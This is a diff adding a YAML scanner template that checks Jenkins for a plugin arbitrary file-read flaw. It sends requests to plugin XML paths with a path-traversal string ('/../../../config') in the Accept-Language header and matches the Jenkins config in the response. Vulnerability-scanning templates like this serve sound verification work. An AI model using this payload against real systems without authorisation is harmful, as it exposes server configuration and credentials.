@@ -1,0 +1,24 @@
+id: poc-yaml-jenkins-arbitrary-file-read
+info:
+  name: Jenkins 插件任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Jenkins
+  osprey-id: vb_2018_0030
+variables:
+  r_path: '/plugin/credentials/.xml
+
+    /plugin/git/.xml
+
+    /plugin/ldap/.xml'
+requests:
+- method: GET
+  path: '{{.r_path}}'
+  headers:
+    Accept-Language: /../../../config
+  expression: 'contains(headers, "Jetty") && status_code == 200 && contains(body,
+    "<version>") && contains(body, "</version>") && contains(body, "jenkins")
+
+    '
+transport: http
